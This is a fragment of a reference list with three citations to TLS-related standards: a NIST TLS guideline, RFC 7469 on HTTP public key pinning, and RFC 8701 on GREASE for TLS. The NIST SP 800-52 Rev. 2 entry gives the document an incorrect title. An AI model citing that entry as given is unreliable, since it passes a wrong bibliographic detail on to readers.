23. NIST SP 800-52 Rev. 2 — Guidelines for TLS Server Authentication. NIST, 2019.
24. RFC 7469 — HTTP Public Key Pinning (HPKP). C. Evans et al., IETF, April 2015.
25. RFC 8701 — Applying Generate Random Extensions And Sustain Extensibility (GREASE) to TLS. D. Benjamin, IETF, January 2020.